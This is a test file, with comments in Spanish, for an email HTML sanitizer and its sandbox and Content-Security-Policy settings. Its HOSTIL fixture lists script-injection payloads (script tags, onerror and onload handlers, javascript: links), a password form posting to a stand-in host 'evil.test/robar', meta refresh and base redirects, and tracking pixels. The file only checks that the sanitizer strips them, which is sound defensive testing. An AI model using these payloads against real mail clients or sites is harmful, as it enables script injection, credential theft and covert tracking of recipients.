// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import {
  SANDBOX_IFRAME,
  cidsReferenciados,
  construirSrcdoc,
  cspDelCuerpo,
  prepararHtml,
} from './htmlSeguro'

/**
 * El fixture hostil: todo lo que un mail real puede traer para ejecutar algo o
 * avisarle al remitente que se abrió. Los cuatro `<script>` que la entrega 0
 * encontró guardados en el legacy eran de este tipo.
 */
const HOSTIL = `
  <style>.x { background: url(https://tracker.test/css.png) }</style>
  <p>Hola</p>
  <script>window.parent.__pwned = 1</script>
  <img src="x" onerror="window.parent.__pwned = 2">
  <a href="javascript:alert(1)">clic</a>
  <a href="https://buscatools.com.ar/precios">precios</a>
  <iframe src="https://evil.test"></iframe>
  <form action="https://evil.test/robar"><input name="clave"><button>Enviar</button></form>
  <svg onload="window.parent.__pwned = 3"><circle r="5"></circle></svg>
  <math><mi xlink:href="javascript:alert(1)">x</mi></math>
  <img src="https://tracker.test/pixel.gif" width="1" height="1">
  <img srcset="https://tracker.test/a.png 1x">
  <td background="https://tracker.test/bg.png"></td>
  <img src="cid:logo@empresa">
  <meta http-equiv="refresh" content="0;url=https://evil.test">
  <base href="https://evil.test/">
  <object data="https://evil.test/x.swf"></object>
  <div style="background-image:url('https://tracker.test/div.png')">caja</div>
`

describe('prepararHtml — lo que no puede ejecutar', () => {
  const { html } = prepararHtml(HOSTIL, { remotas: false })

  it('saca los <script>', () => expect(html).not.toMatch(/<script/i))
  it('saca los handlers on*', () => expect(html).not.toMatch(/\son[a-z]+\s*=/i))
  it('saca javascript: de los links', () => expect(html).not.toMatch(/javascript:/i))
  it('saca iframes, objects, meta refresh y base', () => {
    expect(html).not.toMatch(/<iframe|<object|<meta|<base/i)
  })
  it('saca formularios y sus controles', () => expect(html).not.toMatch(/<form|<input|<button/i))
  it('saca SVG y MathML enteros', () => expect(html).not.toMatch(/<svg|<math/i))
  it('conserva el contenido legítimo y los <style>', () => {
    expect(html).toContain('<p>Hola</p>')
    expect(html).toMatch(/<style>/)
    expect(html).toContain('caja')
  })
  it('los links se abren afuera, sin referrer ni opener', () => {
    expect(html).toContain('href="https://buscatools.com.ar/precios"')
    expect(html).toMatch(/target="_blank"/)
    expect(html).toMatch(/rel="noopener noreferrer"/)
  })
})

describe('prepararHtml — imágenes remotas', () => {
  it('bloqueadas por defecto: el src remoto no queda en el DOM', () => {
    const r = prepararHtml(HOSTIL, { remotas: false })
    expect(r.hayRemotas).toBe(true)
    expect(r.html).not.toContain('tracker.test/pixel.gif')
    expect(r.html).not.toContain('tracker.test/a.png')
    expect(r.html).not.toContain('tracker.test/bg.png')
    expect(r.html).toContain('data-bt-remota="1"')
  })

  it('con permiso explícito, se conservan', () => {
    const r = prepararHtml(HOSTIL, { remotas: true })
    expect(r.html).toContain('https://tracker.test/pixel.gif')
  })

  it('un mail sin remotas no muestra la barra', () => {
    expect(prepararHtml('<p>sin imágenes</p>', { remotas: false }).hayRemotas).toBe(false)
  })

  it('detecta url() remota en CSS aunque no haya <img>', () => {
    expect(prepararHtml('<div style="background:url(//t.test/x.png)">a</div>', { remotas: false }).hayRemotas).toBe(true)
  })
})

describe('prepararHtml — imágenes inline (cid:)', () => {
  it('una inline NO es remota: no enciende la barra', () => {
    const r = prepararHtml('<img src="cid:logo@empresa">', { remotas: false })
    expect(r.hayRemotas).toBe(false)
    expect(r.cidsPendientes).toEqual(['logo@empresa'])
  })

  it('se resuelve con el data URI que trajo el backend', () => {
    const inline = new Map([['logo@empresa', 'data:image/png;base64,iVBORw0KGgo=']])
    const r = prepararHtml('<img src="cid:logo@empresa">', { remotas: false, inline })
    expect(r.html).toContain('src="data:image/png;base64,iVBORw0KGgo="')
    expect(r.cidsPendientes).toEqual([])
  })

  it('cidsReferenciados encuentra los Content-ID del HTML crudo', () => {
    expect(cidsReferenciados('<img src="cid:a@b"><td style="background:url(cid:c@d)">')).toEqual(['a@b', 'c@d'])
  })
})

describe('el iframe', () => {
  it('NUNCA allow-scripts, NUNCA allow-same-origin', () => {
    expect(SANDBOX_IFRAME).not.toContain('allow-scripts')
    expect(SANDBOX_IFRAME).not.toContain('allow-same-origin')
    expect(SANDBOX_IFRAME).not.toContain('allow-forms')
    expect(SANDBOX_IFRAME).not.toContain('allow-top-navigation')
  })

  it('la CSP bloquea scripts siempre y las remotas mientras no se pidan', () => {
    expect(cspDelCuerpo(false)).toContain("default-src 'none'")
    expect(cspDelCuerpo(false)).toContain("script-src 'none'")
    expect(cspDelCuerpo(false)).toMatch(/img-src data:;/)
    expect(cspDelCuerpo(true)).toMatch(/img-src data: https: http:;/)
    expect(cspDelCuerpo(true)).toContain("script-src 'none'")
  })

  it('la CSP va en el <head>, antes que cualquier contenido del mail', () => {
    const doc = construirSrcdoc('<img src="data:image/png;base64,AA==">', false)
    expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('<body>'))
    expect(doc).toContain('name="referrer" content="no-referrer"')
  })
})
